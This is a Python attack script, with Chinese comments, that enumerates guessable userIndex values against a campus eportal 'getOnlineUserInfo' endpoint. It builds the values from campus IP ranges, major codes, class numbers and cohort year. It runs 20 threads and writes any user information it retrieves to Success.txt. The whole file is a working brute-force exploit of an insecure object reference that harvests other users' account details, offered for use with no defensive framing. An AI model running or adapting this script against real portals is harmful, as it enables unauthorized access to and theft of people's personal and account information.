import requests, random, time, os, threading


class GetInfo(object):
    def __init__(self, userIndex):
        self.url = "http://192.168.203.130:8080/eportal/InterFace.do?method=getOnlineUserInfo"
        self.userIndex = userIndex
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"}

    def getinfo(self):
        #print (self.url,self.headers,self.userIndex)
        res = requests.post(self.url, headers=self.headers, data={"userIndex": self.userIndex})
        res.encoding = "utf-8"
        return res.text


def code(str):
    result = ""
    for x in str:
        # print(x)
        if (x == "."):
            result = result + "2e"
        else:
            result = result + "3" + x
    return (result)


def userIndexGen(ident):
    prefix = "31313733643738303032336166356632373035616335663830376234643638315f"

    # 定义专业列表
    list_2 = ["31303631", "31303632", "31303633", "31313631", "31313531", "31313031", "31303731", "31303531",
              "30393531", "30393034", "30383632", "30383631", "30383536", "30383036", "30383035", "30383031",
              "30373534", "30373031", "30363532", "30363531", "30363037", "30363036", "30363034", "30363033",
              "30363032", "30353731", "30353631", "30353532", "30343531", "30343034", "30333631", "30333532",
              "30333531", "30323533", "30323532", "30323031", "30313532", "30313531", "30313034"]
    # 定义班级号列表(我校班级最多的专业为)
    list_3 = ["3031", "3032", "3033", "3034", "3035"]
    # 定义姓氏顺序
    list_4 = ["3031", "3032", "3033", "3034", "3035", "3036", "3037", "3038", "3039", "3130", "3131", "3132", "3133",
              "3134", "3135", "3136", "3137", "3138", "3139", "3230", "3231", "3232", "3233", "3234", "3235", "3236",
              "3237", "3238", "3239", "3330", "3331", "3332", "3333", "3334", "3335", "3336", "3337", "3338", "3339",
              "3430", "3431", "3432", "3433", "3434", "3435", "3436", "3437", "3438", "3439", "3530", "3531", "3532",
              "3533", "3534", "3535", "3536", "3537", "3538", "3539", "3630"]

    # 专业代号(如计科为1061)
    for i in list_2:
        # 班级
        for j in list_3:
            # 班级姓氏顺序
            for k in list_4:
                userIndex = prefix + ident + "5F" + "32303137" + str(i) + str(j) + str(k)
                yield userIndex


def run(gen):
    while True:
        try:
            userIndex = gen.__next__()
        except:
            break
        info = GetInfo(userIndex)
        infom = info.getinfo()
        print("[+] 正在尝试", userIndex, "\n")
        # print(infom)
        if "获取用户信息失败" not in infom:
            print("[+] 获取用户信息成功")
            print(infom)
            with open("Success.txt", "a", encoding="utf-8") as file:
                file.write(infom + "\n")
                break
        time.sleep(random.random())


def test(userIndex):
    info = GetInfo(userIndex)
    print(info.getinfo())


if __name__ == '__main__':
    """
        =======================设置区===========================
    """

    # 线程数量
    threadNum = 20
    # 生成IP编码
    end = 0
    for ip4 in range(1, 255):  # ip第四个字段
        if (end == 1):
            end = 0
            break
        for ip3 in range(1, 3):  # ip第三个字段
            for ip2 in range(2, 4):  # 查询ip10.172和10.173
                ident = code("10.17" + str(ip2) + "." + str(ip3) + "." + str(ip4))
        """
            =====================设置区结束==========================
        """
        userIndex = userIndexGen(ident)
        # print(userIndex.__next__())
        threads = []
        for i in range(threadNum):
            thread = threading.Thread(target=run, args=(userIndex,))
            thread.start()
            threads.append(thread)

    for thread in threads:
        thread.join()

    print()
    print("[+] 已经爬取完成，结果保存在Success.txt")
